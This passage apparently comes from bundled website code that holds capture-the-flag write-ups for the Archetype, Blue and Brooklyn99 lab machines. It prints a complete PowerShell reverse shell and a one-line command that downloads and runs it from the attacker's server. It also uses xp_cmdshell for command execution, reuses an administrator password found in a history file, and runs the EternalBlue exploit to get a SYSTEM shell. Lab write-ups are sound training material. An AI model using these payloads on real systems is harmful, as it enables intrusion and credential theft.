Nmap scan, there is an <b>ms-sql-s<b> service on port 1322.</p>"]},{"id":"Access SQL","title":"<h1><span style=\\"color:#da1953\\">Acc</span>ess SQL</h1>","body":["<p>When it prompt for the password, enter the password found in the configuration file.</p>","<p><pre>$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_svc@10.10.10.27 -windows-auth<br>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation<br><br>Password:<br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(ARCHETYPE): Line 1: Changed database context to \'master\'.<br>[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br>[!] Press help for extra shell commands<br>SQL> <br></pre></p>"]},{"id":"Current user permission","title":"<h1><span style=\\"color:#da1953\\">Cur</span>rent user permission</h1>","body":["<p>To check the permissions of the current user I execute the following query, if from 1 then it means that he has the permissions indicated otherwise not.</p>","<p><pre class=\\"sql-code\\"><span class=\\"keyword\\">SQL&gt;</span><br><span class=\\"keyword\\">select</span> <span class=\\"function\\">IS_SRVROLEMEMBER</span> (\'sysadmin\')<br><span class=\\"output\\">-----------</span><br><span class=\\"number\\">1</span></pre></p>"]},{"id":"Remote Code Execution","title":"<h1><span style=\\"color:#da1953\\">Rem</span>ote Code Execution</h1>","body":["<p>I make an attempt to run some code with the xp_cmdshell function. I have to run the command <code>EXEC sp_configure \'Show Advanced Options\', 1;</code> to configure <i>xp_cmdshell</i> and after each command, I have to issue <code>reconfigure;</code>. Instead, to enable it I have to run this other command <code>EXEC sp_configure \'xp_cmdshell\', 1;</code> and obviously <code>reconfigure;</code>. And finally, I can execute the commands <code>xp_cmdshell <\\"command\\"></code>.</p>","<p><pre class=\\"sql-code\\"><span class=\\"keyword\\">EXEC</span> <span class=\\"function\\">sp_configure</span>(<span class=\\"string\\">\'Show Advanced Options\'</span>, <span class=\\"number\\">1</span>);<br><span class=\\"comment\\">[*] INFO(ARCHETYPE): Line 185: Configuration option \'show advanced options\' changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\\"keyword\\">reconfigure</span>;<br><span class=\\"keyword\\">EXEC</span> <span class=\\"function\\">sp_configure</span>(<span class=\\"string\\">\'xp_cmdshell\'</span>, <span class=\\"number\\">1</span>);<br><span class=\\"comment\\">[*] INFO(ARCHETYPE): Line 185: Configuration option \'xp_cmdshell\' changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\\"keyword\\">reconfigure</span>;<br><span class=\\"function\\">xp_cmdshell</span> <span class=\\"string\\">\\"whoami\\"</span><br><span class=\\"keyword\\">output</span>                                                                             <br>--------------------------------------------------------------------------------   <br><span class=\\"string\\">archetype\\\\sql_svc</span>                                                 <br><span class=\\"keyword\\">NULL</span></pre></p>"]},{"id":"Reverse shell","title":"<h1><span style=\\"color:#da1953\\">Rev</span>erse shell</h1>","body":["<p>For the reverse shell I have to use the one indicated on the official writeup as it checks for malicious pieces of Powershell code.</p>","<p><pre class=\\"powershell-code\\"><span class=\\"variable\\">$client</span> = <span class=\\"cmdlet\\">New-Object</span> <span class=\\"type\\">System.Net.Sockets.TCPClient</span>(\\"10.10.14.84\\", 4444);<br><span class=\\"variable\\">$stream</span> = <span class=\\"variable\\">$client</span>.<span class=\\"method\\">GetStream</span>();<br><span class=\\"type\\">[byte[]]</span><span class=\\"variable\\">$bytes</span> = 0..65535 | <span class=\\"cmdlet\\">%</span>{0};<br><span class=\\"keyword\\">while</span>(<span class=\\"condition\\">($i = $stream.Read($bytes, 0, $bytes.Length))</span> -ne 0) {<br>    <span class=\\"variable\\">$data</span> = (<span class=\\"cmdlet\\">New-Object</span> -<span class=\\"parameter\\">TypeName</span> <span class=\\"type\\">System.Text.ASCIIEncoding</span>).<span class=\\"method\\">GetString</span>($bytes, 0, $i);<br>    <span class=\\"variable\\">$sendback</span> = (<span class=\\"cmdlet\\">iex</span> <span class=\\"variable\\">$data</span> 2>&1 | <span class=\\"cmdlet\\">Out-String</span>);<br>    <span class=\\"variable\\">$sendback2</span> = <span class=\\"variable\\">$sendback</span> + \\"# \\";<br>    <span class=\\"variable\\">$sendbyte</span> = ([text.encoding]::ASCII).<span class=\\"method\\">GetBytes</span>(<span class=\\"variable\\">$sendback2</span>);<br>    <span class=\\"variable\\">$stream</span>.<span class=\\"method\\">Write</span>($sendbyte, 0, $sendbyte.Length);<br>    <span class=\\"variable\\">$stream</span>.<span class=\\"method\\">Flush</span>();<br>}<br><span class=\\"variable\\">$client</span>.<span class=\\"method\\">Close</span>();</pre></p>","<p>Copy and paste the code into a text file and save it with the <b>.ps1</b> extension.</p>",{"id":"Note","title":"<hr><h2>Note</h2>","body":["If you try another reverse shell and it doesn\'t work most likely some of the code is identified as a malicious one and should be adjusted appropriately. For example In the code above <code>PS\\" + (pwd).Path + \\"></code> has been replaced with `#` because it is identified as a malicious string, moreover, that string is not in any way useful for the operation of the reverse shell but only serves to give a friendlier prompt to the user. This issue was thiscussed in the following link at the time whe the box was active: <a href=\\"https://forum.hackthebox.eu/discussion/3509/starting-point\\">https://forum.hackthebox.eu/discussion/3509/starting-point</a>.<hr>"]},"<p>In order to download the reverse shell I have to start e web server, for simplicity in the same forder where i have my reverse shell.</p>","<p><div class=\\"terminal\\"><span class=\\"prompt\\">(kali@kali)~$</span> <span class=\\"command\\">python3 -m http.server 8800</span><br><span class=\\"command\\">Serving HTTP on 0.0.0.0 port 8800 (http://0.0.0.0:8800/) ...</span><br><span class=\\"command\\">10.10.10.27 - - [19/Jun/2021 06:24:20] \\"GET /rev.ps1 HTTP/1.1\\" 200 -</span><br></div></p>","<p>Before downloading and executing the reverse shell I have to listen to the set port with NetCat on another shell.</p>","<p></p>","<p>And finally to download and execute in one shot the reverse shell I use the following Powershell command on the SQL shell, the one where I used mssqlclient.py.</p>","<p><div class=\\"terminal\\"><span class=\\"command\\">xp_cmdshell </span><span class=\\"quote\\">\\"</span><span class=\\"keyword\\">powershell</span><span class=\\"quote\\">\\"</span> <span class=\\"command\\">IEX </span><span class=\\"keyword\\">(New-Object</span><span class=\\"type\\">Net.WebClient</span>)<span class=\\"method\\">.DownloadString</span><span class=\\"quote\\">\\"</span>http://10.10.14.84:8800/rev.ps1<span class=\\"quote\\">\\"</span>;</div></p>","<p>Once connected I obtained a shell where I can run Windows commands.</p>","<p><div class=\\"terminal\\"><span class=\\"prompt\\">(kali@kali)</span><span class=\\"path\\">~/htb/archetype$</span><span class=\\"command\\">nc </span>-lvp</span> 4444 listening on [any] 4444 ...<br/>10.10.10.27: inverse host lookup failed: Unknown host<br/>connect to [10.10.14.84] from (UNKNOWN) [10.10.10.27] 49681<br>#</div></p>"]},{"id":"User flag","title":"<h1><span style=\\"color:#da1953\\">Use</span>r flag</h1>","body":["<p>As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to accessed the PowerShell history file.</p>","<p><pre># type C:\\\\Users\\\\sql_svc\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt<br>net.exe use T: \\\\\\\\Archetype\\\\backups /user:administrator MEGACORP_4dm1n!!</pre></p>","<p>So the credentials for the share backups are: <i>administrator:MEGACORP_4dm1n!!</i>.</p>","<p><pre class=\\"terminal\\"><span class=\\"prompt\\">(kali@kali)</span><span class=\\"path\\">~/htb/archetype$</span><br><span class=\\"command\\">python3</span>/usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27<br>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation<br><br>Password:<br>[*] Requesting shares on 10.10.10.27.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file ehFXfEZp.exe<br>[*] Opening SVCManager on 10.10.10.27.....<br>[*] Creating service FpdE on 10.10.10.27.....<br>[*] Starting service FpdE.....<br>[!] Press help for extra shell commands<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\\\\Windows\\\\system32><br></pre></p>"]},{"id":"Root flag","title":"<h1><span style=\\"color:#da1953\\">Roo</span>t flag</h1>","body":["The root flag si in the Administrator\'s desktop.","<p><pre>Directory of C:\\\\Users\\\\Administrator\\\\Desktop<br><br>01/20/2020  06:42 AM    &lt;DIR&gt;          .<br>01/20/2020  06:42 AM    &lt;DIR&gt;          ..<br>02/25/2020  07:36 AM                32 root.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  33,819,779,072 bytes free<br><br>C:\\\\Users\\\\Administrator\\\\Desktop>type root.txt<br>b91ccec3305e98240082d4474b848528<br></pre></p>"]}]}]}')},1047:e=>{"use strict";e.exports=JSON.parse('{"title":"Blue","path":"blue","tags":["easy","ctf","box","thm","cve","eternal blue","ms17-010","rce","windows","metasploit","smb","ejpt","oscp"],"date":"MAR 2025","location":"./writeup/","banner":"writeup/blue/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with nmap and finding the host exposing posts 135 msrpc, 139 netbios-ssn, 445 microsoft-ds, 3389 ssl/ms-wbt-server?, 49152 msrpc, 49153 msrpc, 49154 msrpc, 49158 msrpc, and 49159 msrpc."},{"section":"Enumeration","description":"Enumerating the machine to confirm indication about the presense of Eternal Blue (ms17-010) vulnerability in the Windows 7 Pro Service Pack 1 exposing SMB v1"},{"section":"Enumeration","description":"Performing vulnerability scanning with Nmap confirming the presence of Eternal Blue (ms17-010) vulnerability"},{"section":"Exploitation","description":"Exploitin Eternal Blue (ms17-010) via Metasploit, setting up all the parameters to perfomr remote code execution and obtain a reverse shell"}],"body":[{"id":"Blue","title":"<h1> <span style=\\"color:#da1953\\">Blu</span>e</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/blue/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre># Nmap 7.94SVN scan initiated Fri Mar 14 20:07:43 2025 as: nmap -sC -sV -oN nmap 10.10.22.152<br>Nmap scan report for 10.10.22.152<br>Host is up (0.033s latency).<br>Not shown: 991 closed tcp ports (conn-refused)<br>PORT      STATE SERVICE            VERSION<br>135/tcp   open  msrpc              Microsoft Windows RPC<br>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)<br>3389/tcp  open  ssl/ms-wbt-server?<br>| rdp-ntlm-info: <br>|   Target_Name: JON-PC<br>|   NetBIOS_Domain_Name: JON-PC<br>|   NetBIOS_Computer_Name: JON-PC<br>|   DNS_Domain_Name: Jon-PC<br>|   DNS_Computer_Name: Jon-PC<br>|   Product_Version: 6.1.7601<br>|_  System_Time: 2025-03-15T00:09:08+00:00<br>|_ssl-date: 2025-03-15T00:09:13+00:00; -1s from scanner time.<br>| ssl-cert: Subject: commonName=Jon-PC<br>| Not valid before: 2025-03-14T00:07:24<br>|_Not valid after:  2025-09-13T00:07:24<br>49152/tcp open  msrpc              Microsoft Windows RPC<br>49153/tcp open  msrpc              Microsoft Windows RPC<br>49154/tcp open  msrpc              Microsoft Windows RPC<br>49158/tcp open  msrpc              Microsoft Windows RPC<br>49159/tcp open  msrpc              Microsoft Windows RPC<br>Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:ea:88:94:7d:bf (unknown)<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   date: 2025-03-15T00:09:08<br>|_  start_date: 2025-03-15T00:07:22<br>| smb-os-discovery: <br>|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)<br>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional<br>|   Computer name: Jon-PC<br>|   NetBIOS computer name: JON-PC\\\\x00<br>|   Workgroup: WORKGROUP\\\\x00<br>|_  System time: 2025-03-14T19:09:08-05:00<br>|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: 0s<br>| smb2-security-mode: <br>|   2:1:0: <br>|_    Message signing enabled but not required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Fri Mar 14 20:09:14 2025 -- 1 IP address (1 host up) scanned in 90.66 seconds<br></pre></p>","<p>I have 9 open ports: 135 msrpc, 139 netbios-ssn, 445 microsoft-ds, 3389 ssl/ms-wbt-server?, 49152 msrpc, 49153 msrpc, 49154 msrpc, 49158 msrpc, and 49159 msrpc. These ports are common to find open in a Windows system.</p>"]},{"id":"Enumeration","title":"<h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":["<p>From this Nmap scan, I can see the operating system version, which is a Windows 7 Pro Service pack 1 and the SMB v1. To find out that the SMB is version 1 there are a few indicators that confirm such:</p>","<p><ol><li><b>Presence of Ports 139 and 445</b></li><ul><li>Port 139 (NetBIOS-SSN): Used by SMB over NetBIOS, typically associated with SMBv1.</li><li>Port 445 (Microsoft-DS): Used by SMB directly over TCP without NetBIOS.</li></ul><li><b>Lack of SMBv2 Protocol Details</b></li><ul><li>asdaThe scan does not list SMBv2 explicitly. If SMBv2 or SMBv3 were enforced, you would see more details under <code>smb2-security-mode</code> and <code>smb2-time</code>.</li></ul><li><b>SMB Message Signing is Disabled</b></li><ul><li><code>message_signing: disabled</code> appears in the <code>smb-security-mode</code> script output.</li><li>While message signing is optional in SMBv2, it\'s typically disabled in SMBv1 by default, making it a common indicator of SMBv1 being enabled.</li></ul><li><b>Windows Version (Windows 7 SP1)</b></li><ul><li>Windows 7 (especially without modern patches) still supports SMBv1 by default.</li><li>Since the scan identifies Windows 7 Professional 7601 Service Pack 1, it\'s likely that SMBv1 is still enabled unless explicitly disabled by the administrator.</li></ul><li><b>No SMBv2 Negotiation Detected</b></li><ul><li>The smb2-security-mode script output only shows:<pre>| smb2-security-mode: <br>|   2:1:0: <br>|_    Message signing enabled but not required</pre></li><li>If SMBv1 were fully disabled, you would typically see more details about SMBv2/SMBv3 negotiation.</li></ul></ol></p>","<p>So these are the indications of an Eternal Blue vulnerability. To further confirm the presence of such vulnerability I run a vulnerability scan with Nmap <code>nmap --script=*vuln* 10.10.22.152</code> where <code>*vuln*</code> means run every script that contains the substring \\"vuln\\" in the name. In this way, I don\'t have to specify all the scripts manually or run one-by-one scripts for vulnerability scans.</p>","<p><pre># Nmap 7.94SVN scan initiated Fri Mar 14 20:11:55 2025 as: nmap --script=*vuln* -oN vuln-scan 10.10.22.152<br>Nmap scan report for 10.10.22.152<br>Host is up (0.030s latency).<br>Not shown: 991 closed tcp ports (conn-refused)<br>PORT      STATE SERVICE<br>135//tcp   open  msrpc<br>139//tcp   open  netbios-ssn<br>445//tcp   open  microsoft-ds<br>3389//tcp  open  ms-wbt-server<br>49152//tcp open  unknown<br>49153//tcp open  unknown<br>49154//tcp open  unknown<br>49158//tcp open  unknown<br>49159//tcp open  unknown<br><br>Host script results:<br>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED<br>| smb-vuln-ms17-010: <br>|   VULNERABLE:<br>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2017-0143<br>|     Risk factor: HIGH<br>|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br>|        servers (ms17-010).<br>|           <br>|     Disclosure date: 2017-03-14<br>|     References:<br>|       https:////blogs.technet.microsoft.com//msrc//2017//05//12//customer-guidance-for-wannacrypt-attacks//<br>|       https:////cve.mitre.org//cgi-bin//cvename.cgi?name=CVE-2017-0143<br>|_      https:////technet.microsoft.com//en-us//library//security//ms17-010.aspx<br>|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED<br>|_smb-vuln-ms10-054: false<br><br># Nmap done at Fri Mar 14 20:13:22 2025 -- 1 IP address (1 host up) scanned in 87.08 seconds<br></pre></p>","<p>Nmap also confirms the presense of the vulnerability Eternal Blue which is also indicated as ms17-010 or CVE-2017-0143.</p>"]},{"id":"Exploitation","title":"<h1><span style=\\"color:#da1953\\">Exp</span>loitation</h2>","body":["<p>To exploit this vulnerability I will use Metasploit (<code>msfconsole</code>) and search for Eternal Blue.</p>","<p><pre>$ msfconsole<br>Metasploit tip: View all productivity tips with the tips command<br>                                                  <br># cowsay++<br> ____________<br>&lt; metasploit &gt;<br> ------------<br>       \\\\   ,__,<br>        \\\\  (oo)____<br>           (__)    )\\\\<br>              ||--|| *<br><br><br>       =[ metasploit v6.4.18-dev                          ]<br>+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]<br>+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search Eternal Blue<br><br>Matching Modules<br>================<br><br>   #   Name                                           Disclosure Date  Rank     Check  Description<br>   -   ----                                           ---------------  ----     -----  -----------<br>   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption<br>   1     \\\\_ target: Automatic Target                  .                .        .      .<br>   2     \\\\_ target: Windows 7                         .                .        .      .<br>   3     \\\\_ target: Windows Embedded Standard 7       .                .        .      .<br>   4     \\\\_ target: Windows Server 2008 R2            .                .        .      .<br>   5     \\\\_ target: Windows 8                         .                .        .      .<br>   6     \\\\_ target: Windows 8.1                       .                .        .      .<br>   7     \\\\_ target: Windows Server 2012               .                .        .      .<br>   8     \\\\_ target: Windows 10 Pro                    .                .        .      .<br>   9     \\\\_ target: Windows 10 Enterprise Evaluation  .                .        .      .<br>   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution<br>   11    \\\\_ target: Automatic                         .                .        .      .<br>   12    \\\\_ target: PowerShell                        .                .        .      .<br>   13    \\\\_ target: Native upload                     .                .        .      .<br>   14    \\\\_ target: MOF upload                        .                .        .      .<br>   15    \\\\_ AKA: ETERNALSYNERGY                       .                .        .      .<br>   16    \\\\_ AKA: ETERNALROMANCE                       .                .        .      .<br>   17    \\\\_ AKA: ETERNALCHAMPION                      .                .        .      .<br>   18    \\\\_ AKA: ETERNALBLUE                          .                .        .      .<br>   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution<br>   20    \\\\_ AKA: ETERNALSYNERGY                       .                .        .      .<br>   21    \\\\_ AKA: ETERNALROMANCE                       .                .        .      .<br>   22    \\\\_ AKA: ETERNALCHAMPION                      .                .        .      .<br>   23    \\\\_ AKA: ETERNALBLUE                          .                .        .      .<br>   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection<br>   25    \\\\_ AKA: DOUBLEPULSAR                         .                .        .      .<br>   26    \\\\_ AKA: ETERNALBLUE                          .                .        .      .<br>   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution<br>   28    \\\\_ target: Execute payload (x64)             .                .        .      .<br>   29    \\\\_ target: Neutralize implant                .                .        .      .<br><br><br>Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce<br>After interacting with a module you can manually set a TARGET with set TARGET \'Neutralize implant\'<br><br>msf6 &gt;</pre></p>","<p>Now I can select the first exploit hoping it works, if not I will try each. After choosing the exploit I have to check the available options and set them.</p>","<p><pre>msf6 &gt; use 0<br>[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br><br>Module options (exploit/windows/smb/ms17_010_eternalblue):<br><br>   Name           Current Setting  Required  Description<br>   ----           ---------------  --------  -----------<br>   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl<br>                                             oit/basics/using-metasploit.html<br>   RPORT          445              yes       The target port (TCP)<br>   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects<br>                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target<br>                                             machines.<br>   SMBPass                         no        (Optional) The password for the specified username<br>   SMBUser                         no        (Optional) The username to authenticate as<br>   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind<br>                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach<br>                                             ines.<br>   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server<br>                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.<br><br><br>Payload options (windows/x64/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  thread           yes       Exit technique (Accepted: \'\', seh, thread, process, none)<br>   LHOST     192.168.135.128  yes       The listen address (an interface may be specified)<br>   LPORT     4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic Target<br><br><br><br>View the full module info with the info, or info -d command.<br><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.232.74<br>RHOSTS =&gt; 10.10.232.74<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.21.112.161<br>LHOST =&gt; 10.21.112.161<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br><br>Module options (exploit/windows/smb/ms17_010_eternalblue):<br><br>   Name           Current Setting  Required  Description<br>   ----           ---------------  --------  -----------<br>   RHOSTS         10.10.232.74     yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl<br>                                             oit/basics/using-metasploit.html<br>   RPORT          445              yes       The target port (TCP)<br>   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects<br>                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target<br>                                             machines.<br>   SMBPass                         no        (Optional) The password for the specified username<br>   SMBUser                         no        (Optional) The username to authenticate as<br>   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind<br>                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach<br>                                             ines.<br>   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server<br>                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.<br><br><br>Payload options (windows/x64/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  thread           yes       Exit technique (Accepted: \'\', seh, thread, process, none)<br>   LHOST     10.21.112.161    yes       The listen address (an interface may be specified)<br>   LPORT     4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic Target<br><br><br><br>View the full module info with the info, or info -d command.<br><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;</pre></p>","<p>The only thing that remains now is to exploit it!</p>","<p><pre>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit<br><br>[*] Started reverse TCP handler on 10.21.112.161:4444 <br>[*] 10.10.232.74:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check<br>[+] 10.10.232.74:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)<br>[*] 10.10.232.74:445      - Scanned 1 of 1 hosts (100% complete)<br>[+] 10.10.232.74:445 - The target is vulnerable.<br>[*] 10.10.232.74:445 - Connecting to target for exploitation.<br>[+] 10.10.232.74:445 - Connection established for exploitation.<br>[+] 10.10.232.74:445 - Target OS selected valid for OS indicated by SMB reply<br>[*] 10.10.232.74:445 - CORE raw buffer dump (42 bytes)<br>[*] 10.10.232.74:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes<br>[*] 10.10.232.74:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv<br>[*] 10.10.232.74:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      <br>[+] 10.10.232.74:445 - Target arch selected valid for arch indicated by DCE/RPC reply<br>[*] 10.10.232.74:445 - Trying exploit with 12 Groom Allocations.<br>[*] 10.10.232.74:445 - Sending all but last fragment of exploit packet<br>[*] 10.10.232.74:445 - Starting non-paged pool grooming<br>[+] 10.10.232.74:445 - Sending SMBv2 buffers<br>[+] 10.10.232.74:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.<br>[*] 10.10.232.74:445 - Sending final SMBv2 buffers.<br>[*] 10.10.232.74:445 - Sending last fragment of exploit packet!<br>[*] 10.10.232.74:445 - Receiving response from exploit packet<br>[+] 10.10.232.74:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!<br>[*] 10.10.232.74:445 - Sending egg to corrupted connection.<br>[*] 10.10.232.74:445 - Triggering free of corrupted buffer.<br>[*] Sending stage (201798 bytes) to 10.10.232.74<br>[*] Meterpreter session 1 opened (10.21.112.161:4444 -&gt; 10.10.232.74:49194) at 2025-03-17 19:25:08 -0400<br>[+] 10.10.232.74:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[+] 10.10.232.74:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[+] 10.10.232.74:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br><br>meterpreter &gt;</pre></p>","<p>To get the shell I can simply run the command <code>shell</code>.</p>","<p><pre>meterpreter &gt;   shell<br>Process 1520 created.<br>Channel 1 created.<br>Microsoft Windows [Version 6.1.7601]<br>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.<br><br>C:\\\\Windows\\\\system32&gt;whoami<br>whoami<br>nt authority\\\\system</pre></p>","<p>At this point, you can search the system for the flags in the time needed.</p>"]}]}]}')},2171:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Brooklyn99","path":"brooklyn99","tags":["thm","easy"],"date":"AUG 2024","location":"./writeup/","banner":"writeup/brooklyn99/banner.gif","type":"writeup","search":[{"section":"","description":"Scanning with Nmap, discovering ports 135 msrpc, 139 netbios-ssn, 445 microsoft-ds and 1433 ms-sql-s"}],"body":[{"id":"Brooklyn99","title":"<h1> <span style=\\"color:#da1953\\">Bro</span>oklyn Nine Nine</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/broklyn99/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<br><pre>$ nmap -sC -sV -oN nmap-scan 10.10.134.153<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 11:53 EDT<br>Nmap scan report for 10.10.134.153<br>Host is up (0.036s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:10.21.112.161<br>|      Logged in as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 2<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)<br>|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)<br>|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Site doesn\'t have a title (text/html).<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds<br></pre><br>","<p>I have 3 open ports: 21 ftp, 22 ssh and 80 http.</p>"]},{"id":"FTP Enumeration","title":"<hr><h1><span style=\\"color:#da1953\\">FTP </span>Enumeration</h1>","body":["<p>One of the first things to check for FTP is the anonymous login, where the credentials are <i>anonymous:anonymous</i>. Not only was I able to access it, but I also retrieved a file containing a name which can be a potential user.</p>","<p><pre>$ ftp 10.10.134.153<br>Connected to 10.10.134.153.<br>220 (vsFTPd 3.0.3)<br>Name (10.10.134.153:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.<br>ftp> ls<br>229 Entering Extended Passive Mode (|||8548|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt<br>226 Directory send OK.<br>ftp> get note_to_jake.txt<br>local: note_to_jake.txt 